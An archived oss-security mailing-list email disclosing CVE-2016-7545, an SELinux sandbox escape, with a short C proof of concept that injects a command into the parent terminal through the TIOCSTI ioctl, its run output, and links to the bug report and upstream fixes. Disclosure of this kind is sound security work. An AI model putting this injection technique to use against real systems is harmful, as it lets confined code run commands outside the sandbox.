X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1150" "Sunday" "25" "September" "2016" "13:49:11" "+0200" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20160925134911.18991732ntfvg5a8@webmail.alunos.dcc.fc.up.pt>" "42" "[oss-security] CVE-2016-7545 -- SELinux sandbox escape" nil nil nil "9" "2016092511:49:11" "[oss-security] CVE-2016-7545 -- SELinux sandbox escape" (number mark "U       up201407890@ Sep 25   42/1150  " thread-indent "\"[oss-security] CVE-2016-7545 -- SELinux sandbox escape\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 27888 invoked by uid 550); 25 Sep 2016 11:57:26 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24275 invoked from network); 25 Sep 2016 11:49:26 -0000
Message-ID: <20160925134911.18991732ntfvg5a8@webmail.alunos.dcc.fc.up.pt>
Date: Sun, 25 Sep 2016 13:49:11 +0200
From: up201407890@alunos.dcc.fc.up.pt
To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: text/plain;
	charset=ISO-8859-1;
	DelSp="Yes";
	format="flowed"
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
User-Agent: Internet Messaging Program (IMP) H3 (4.2)
X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
Subject: [oss-security] CVE-2016-7545 -- SELinux sandbox escape

Hi,

When executing a program via the SELinux sandbox, the nonpriv session
can escape to the parent session by using the TIOCSTI ioctl to push
characters into the terminal's input buffer, allowing an attacker to
escape the sandbox.

$ cat test.c
#include <unistd.h>
#include <sys/ioctl.h>

int main()
{
     char *cmd =3D "id\n";
     while(*cmd)
      ioctl(0, TIOCSTI, cmd++);
     execlp("/bin/id", "id", NULL);
}

$ gcc test.c -o test
$ /bin/sandbox ./test
id
uid=3D1000 gid=3D1000 groups=3D1000
context=3Dunconfined_u:unconfined_r:sandbox_t:s0:c47,c176
$ id    <------ did not type this
uid=3D1000(saken) gid=3D1000(saken) groups=3D1000(saken)
context=3Dunconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Bug report:
https://bugzilla.redhat.com/show_bug.cgi?id=3D1378577

Upstream fix:
https://marc.info/?l=3Dselinux&m=3D147465160112766&w=3D2
https://marc.info/?l=3Dselinux&m=3D147466045909969&w=3D2
https://github.com/SELinuxProject/selinux/commit/acca96a135a4d2a028ba9b6368=
86af99c0915379

Federico Bento.

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

